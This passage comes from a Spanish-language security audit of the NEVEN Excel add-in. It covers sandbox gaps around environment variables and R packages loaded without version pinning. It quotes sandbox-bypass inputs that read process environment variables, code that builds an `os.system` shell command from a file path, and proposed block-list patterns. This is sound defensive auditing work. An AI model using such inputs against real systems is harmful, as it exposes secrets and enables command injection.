- **Archivo:** startup/startup.jl:195, Common/SandboxVerifier.cc:115-145
- **Línea:** 195 (startup.jl)
- **Contexto:**
```julia
# startup.jl:195 — el script de inicio usa ENV internamente
dir = get(ENV, "NEVEN_HOME", "C:\\NEVEN")
```
```cpp
// SandboxVerifier.cc — lista de funciones Julia bloqueadas
// NO incluye ENV[], get(ENV,...), ni haskey(ENV,...)
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Variables de entorno sensibles
- **Descripción:** El `SandboxVerifier` no bloquea el acceso a `ENV` (el diccionario global de variables de entorno de Julia) desde código de usuario. Un usuario puede ejecutar `=NEVEN.j("collect(ENV)")` o `=NEVEN.j("ENV[\"USERPROFILE\"]")` para leer cualquier variable de entorno del proceso ControlJulia.exe. Dado que ControlJulia.exe es un proceso hijo del XLL, hereda todas las variables de entorno del proceso Excel, incluyendo potencialmente información sensible.
- **Recomendación:**
  1. Agregar patrones de bloqueo para Julia en `SandboxVerifier.cc`:
     - `{"env[", "ENV[] — environment variable read blocked"}`
     - `{"get(env", "get(ENV,...) — environment variable read blocked"}`
  2. Considerar limpiar variables de entorno sensibles al iniciar ControlJulia.exe (pasar un environment block filtrado a `CreateProcessA`).

---

### [SEC-ALT-012] quarto_render() expone sys.executable como variable de entorno QUARTO_PYTHON

- **Archivo:** startup/startup.py:353-358
- **Línea:** 353
- **Contexto:**
```python
env_str = "QUARTO_PYTHON=" + sys.executable
cmd = "set " + env_str + " && quarto render " + '"' + fp + '"' + " --to " + fmt
work_dir = os.path.dirname(fp) or "."
full_cmd = 'start /B /D "' + work_dir + '" cmd /C "' + cmd + '"'
os.system(full_cmd)
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Variables de entorno sensibles
- **Descripción:** La función `quarto_render()` establece la variable de entorno `QUARTO_PYTHON` con el valor de `sys.executable` (la ruta completa al intérprete Python embebido) y la pasa a un subproceso via `os.system()`. Esto tiene múltiples implicaciones:
  1. **Exposición de ruta interna:** Revela la ubicación exacta del intérprete Python embebido en el sistema de archivos.
  2. **Uso de `os.system()`:** Esta función invoca `cmd.exe` como shell intermedio, lo que expone la variable de entorno al entorno del shell y potencialmente a procesos hijos.
  3. **Bypass del sandbox:** `quarto_render` es una función de librería "confiable" que no pasa por el `SandboxVerifier`, pero usa `os.system()` — la misma función que el sandbox bloquea para código de usuario. Esto ya fue reportado en la tarea 3.3 como hallazgo de inyección de comandos.
  4. **Persistencia:** La variable `QUARTO_PYTHON` queda establecida en el entorno del subproceso `cmd.exe`, visible para Quarto y cualquier proceso que este lance.
- **Recomendación:**
  1. Usar `subprocess.Popen` con el parámetro `env` para pasar `QUARTO_PYTHON` solo al proceso Quarto sin afectar el entorno global.
  2. Evitar `os.system()` — usar `subprocess.run()` o `subprocess.Popen()` con `shell=False`.
  3. Considerar si `QUARTO_PYTHON` es realmente necesario o si Quarto puede descubrir Python por sí mismo.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-ENV-001] Python sandbox bloquea acceso a os.environ desde código de usuario

- **Archivo:** Common/SandboxVerifier.cc:181-182
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Variables de entorno sensibles
- **Descripción:** El `SandboxVerifier` bloquea explícitamente `os.environ[` y `os.putenv()` para código Python de usuario, previniendo que scripts ejecutados via `=NEVEN.p()` lean o modifiquen variables de entorno. Este es el nivel de protección correcto que debería extenderse a R y Julia.

### [FOR-ENV-002] Scripts de startup no imprimen ni loguean valores de variables de entorno

- **Archivo:** startup/startup.r, startup/startup.jl, startup/startup.py
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Variables de entorno sensibles
- **Descripción:** Ninguno de los tres scripts de startup imprime, loguea ni expone los valores de las variables de entorno que lee. Los valores se usan internamente para construir rutas de directorio pero nunca se muestran al usuario ni se escriben en archivos de log. El único `print` relacionado es el puntero de aplicación Excel (`"Excel application pointer installed: 0x..."`) que no es una variable de entorno.

### [FOR-ENV-003] Variables de entorno usadas con fallback seguro a valores por defecto

- **Archivo:** startup/startup.py:583, startup/startup.jl:195
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Variables de entorno sensibles
- **Descripción:** Todos los accesos a variables de entorno en los scripts de startup usan el patrón `get(ENV, "KEY", "default")` o `os.environ.get("KEY", "default")` con valores por defecto hardcodeados. Esto asegura que: (1) el sistema funciona aunque las variables no estén definidas, (2) no se producen excepciones por variables faltantes, (3) los valores por defecto son rutas conocidas y no sensibles (`"C:\\NEVEN"`).

### [FOR-ENV-004] No se modifica PATH ni variables de entorno del sistema

- **Archivo:** startup/startup.r, startup/startup.jl, startup/startup.py
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Variables de entorno sensibles
- **Descripción:** Ningún script de startup modifica `PATH`, `PATHEXT`, `COMSPEC` ni ninguna otra variable de entorno del sistema. Las variables se leen pero nunca se escriben (excepto `QUARTO_PYTHON` que se establece solo en el entorno de un subproceso temporal). Esto previene que los scripts de inicio contaminen el entorno del proceso Excel o de otros procesos hijos.

---

## Resumen de Severidades

| ID | Título | Severidad |
|----|--------|-----------|
| SEC-ALT-010 | Sys.getenv() no bloqueado por sandbox R | Alta |
| SEC-ALT-011 | ENV[] no bloqueado por sandbox Julia | Alta |
| SEC-ALT-012 | quarto_render() expone sys.executable via QUARTO_PYTHON | Alta |

---

## Nota sobre Exclusiones

- Los archivos en `Build/Dist*/NEVEN/startup/` son copias de distribución del mismo código y no se analizaron por separado.
- El directorio `startup/__pycache__/` contiene bytecode compilado y fue excluido.
- Los archivos `.sha256` (`startup.r.sha256`, `startup.jl.sha256`) son checksums de integridad y no contienen código ejecutable.

---

# Hallazgos de Seguridad — Carga de Dependencias sin Verificación de Versión

**Tarea:** 3.5 Verificar carga de dependencias externas sin verificación de versión o integridad  
**Fecha:** 2026-01-XX  
**Alcance:** libreria/R/, libreria/JULIA/, startup/startup.r, startup/startup.jl, startup/startup.py  
**Extensiones:** .R, .jl, .py

---

## Resumen del Escaneo

### Paquetes R cargados sin versión específica

Se identificaron **~50 llamadas `library()` / `require()`** distribuidas en 22 archivos de `libreria/R/` que cargan paquetes externos sin especificar versión mínima ni verificar integridad:

| Archivo | Paquetes cargados |
|---------|-------------------|
| R4XCL-AD-ACP.R | PerformanceAnalytics |
| R4XCL-AD-Dashboard.R | jsonlite, rpivotTable, htmlwidgets |
| R4XCL-AD-D3.R | jsonlite |
| R4XCL-AD-Esquisse.R | plotly, htmlwidgets, jsonlite |
| R4XCL-AD-KMediass.R | cluster |
| R4XCL-AD-Map.R | jsonlite |
| R4XCL-AD-NonParRolCor.R | NonParRolCor (×3) |
| R4XCL-AD-Pivot.R | rpivotTable, htmlwidgets |
| R4XCL-AD-TextMining.R | tm, SnowballC, wordcloud, RColorBrewer, svDialogs, tcltk |
| R4XCL-BD-ObtieneDatos.R | svDialogs |
| R4XCL-DS-Wooldridge.R | wooldridge |
| R4XCL-FX-Calculos.R | dummies, svDialogs |
| R4XCL-GR-Graficacion.R | svDialogs |
| R4XCL-GR-Interactivos.R | magrittr, highcharter, htmlwidgets, fs |
| R4XCL-GR-Mapa.R | rworldmap |
| R4XCL-GR-PlotlyView.R | plotly, htmlwidgets |
| R4XCL-GR-QuickPlot.R | ggplot2, plotly, htmlwidgets |
| R4XCL-RG-ArbolDecision.R | rpart, rpart.plot, svDialogs |
| R4XCL-RG-Binaria.R | stargazer |
| R4XCL-RG-DatosPanel.R | plm, stargazer, svDialogs, tseries |
| R4XCL-RG-Lineal.R | stargazer, margins, usdm |
| R4XCL-RG-Poisson.R | ResourceSelection, sandwich, margins, stargazer |
| R4XCL-RG-SeriesTiempo.R | tseries (×3), mFilter |
| R4XCL-RG-SVM.R | e1071 |
| R4XCL-RG-Tobit.R | ResourceSelection, margins, VGAM |
| R4XCL-UT-Pivote.R | svDialogs (×2) |
| R4XCL-0-Interno-1.R | svDialogs, writexl |
| R4XCL-0-UT-Ayuda.R | svDialogs, fs |

Adicionalmente, se usan llamadas con namespace explícito (`paquete::funcion()`) sin `library()` previo en: `sandwich::vcovHC`, `car::vif`, `lmtest::bptest`, `ResourceSelection::hoslem.test`, `tidyr::unnest`, `usdm::vif`, `VGAM::vglm`.

**Total de paquetes R únicos identificados:** ~35 paquetes externos.  
**Mecanismo de version pinning:** Ninguno. No existe `renv.lock`, `DESCRIPTION` con versiones mínimas, ni llamadas a `packageVersion()` para validación en runtime.

### Paquetes Julia cargados

| Archivo | Paquetes |
|---------|----------|
| functions.jl | LinearAlgebra, Statistics, DelimitedFiles, Dates, Random |
| J4XCL-CN-Conectividad.jl | DelimitedFiles, Dates |
| J4XCL-ML-Aprendizaje.jl | Statistics, Random |
| J4XCL-MT-Matematicas.jl | LinearAlgebra |
| J4XCL-OP-Optimizacion.jl | LinearAlgebra |

**Todos son módulos de la biblioteca estándar de Julia** (stdlib). Están incluidos en la sysimage precompilada (`neven_julia.dll`) generada por `scripts/build-julia-sysimage.jl`. No existe `Project.toml` ni `Manifest.toml` para pinning de versiones, pero al ser stdlib, sus versiones están implícitamente fijadas por la versión de Julia (1.12.6).

### Paquetes Python cargados

| Archivo | Paquetes |
|---------|----------|
| startup/startup.py | sys, os, io, inspect, types, random, datetime, threading, time, json, base64, glob, urllib |

**Todos son módulos de la biblioteca estándar de Python.** El script realiza checks opcionales para `numpy`, `pandas`, `matplotlib`, `sklearn` pero solo emite warnings si no están disponibles — no los carga como dependencia obligatoria.

---

## Hallazgos

---

### [SEC-MED-005] Paquetes R cargados sin verificación de versión ni integridad

- **Archivo:** libreria/R/ (22 archivos, ~50 llamadas `library()`/`require()`)
- **Línea:** Múltiples (ver tabla resumen arriba)
- **Severidad:** Media
- **Categoría:** Seguridad > Dependencias sin verificación
- **Descripción:** La librería R4XCL carga ~35 paquetes R externos usando `library()` y `require()` sin ningún mecanismo de verificación de versión o integridad. Los paquetes se cargan desde la instalación local de R del usuario sin validar que sean versiones compatibles o que no hayan sido manipulados. Riesgos específicos:
  1. **Incompatibilidad silenciosa:** Un usuario con una versión antigua de un paquete (ej: `plotly` 3.x vs 4.x) puede obtener errores crípticos o resultados incorrectos sin indicación clara de la causa.
  2. **Supply chain:** Si un paquete instalado localmente fue comprometido (typosquatting, repositorio CRAN comprometido, paquete modificado post-instalación), se cargará sin verificación.
  3. **Reproducibilidad:** Diferentes usuarios con diferentes versiones de paquetes obtendrán resultados potencialmente distintos para las mismas operaciones estadísticas.
  
  No existe `renv.lock`, archivo `DESCRIPTION` con versiones mínimas, ni validación en runtime con `packageVersion()`. La única referencia a versiones encontrada es un comentario (`#print(packageVersion("svDialogs"))`) en `R4XCL-FX-Calculos.R`.
- **Recomendación:**
  1. Crear un archivo `renv.lock` o equivalente que documente las versiones mínimas requeridas de cada paquete.
  2. Agregar validación en `startup.r` o en un script de verificación que compare `packageVersion()` contra versiones mínimas conocidas.
  3. Documentar las versiones de paquetes R probadas y soportadas.
  4. Considerar usar `requireNamespace()` con manejo de error informativo (como ya se hace en `R4XCL-DS-Wooldridge.R` y `R4XCL-AD-Pivot.R`) en lugar de `library()` directo.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-DEP-001] Julia usa exclusivamente módulos stdlib — sin dependencias externas en producción

- **Archivo:** libreria/JULIA/ (5 archivos)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Dependencias sin verificación
- **Descripción:** La librería J4XCL usa únicamente módulos de la biblioteca estándar de Julia (LinearAlgebra, Statistics, DelimitedFiles, Dates, Random). Estos módulos están incluidos en la distribución de Julia y sus versiones están implícitamente fijadas por la versión del runtime (Julia 1.12.6). Además, están precompilados en la sysimage (`neven_julia.dll`), lo que elimina tanto el riesgo de supply chain como la variabilidad de versiones entre usuarios. El script `build-julia-sysimage.jl` confirma que no se agregan paquetes externos (`nothing` como primer argumento de `create_sysimage`).

### [FOR-DEP-002] Python usa exclusivamente módulos stdlib — sin dependencias externas obligatorias

- **Archivo:** startup/startup.py
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Dependencias sin verificación
- **Descripción:** El script de startup de Python importa únicamente módulos de la biblioteca estándar (sys, os, io, inspect, types, random, datetime, threading, time, json, base64, glob, urllib). Los paquetes opcionales (numpy, pandas, matplotlib, sklearn) se verifican con `_check_package()` que solo emite un warning si no están disponibles — no son dependencias obligatorias del sistema. Esto elimina el riesgo de supply chain para la funcionalidad core de Python.

### [FOR-DEP-003] Verificación de integridad SHA-256 para scripts de startup

- **Archivo:** Common/SecurityService.cc, startup/startup.r.sha256, startup/startup.jl.sha256
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Dependencias sin verificación
- **Descripción:** El proyecto implementa verificación de integridad SHA-256 para los scripts de startup mediante `SecurityService::VerifyScriptIntegrity()`. Cada script tiene un archivo sidecar `.sha256` con el hash esperado. Antes de cargar un script, `LanguageService::ReadSourceFile()` verifica que el hash calculado coincida con el almacenado. Esto protege contra modificación no autorizada de los scripts de inicio, aunque no cubre los paquetes externos que estos scripts cargan.

---

## Nota sobre Alcance

- Los paquetes R se cargan en runtime desde la instalación local del usuario. NEVEN no distribuye ni controla las versiones de estos paquetes.
- Los paquetes Julia están baked en la sysimage precompilada, eliminando variabilidad en producción.
- Python está deprecado (OFF por defecto) y su startup script no carga paquetes externos obligatorios.
- La verificación SHA-256 existente protege los scripts de startup pero no los paquetes que estos cargan.

---
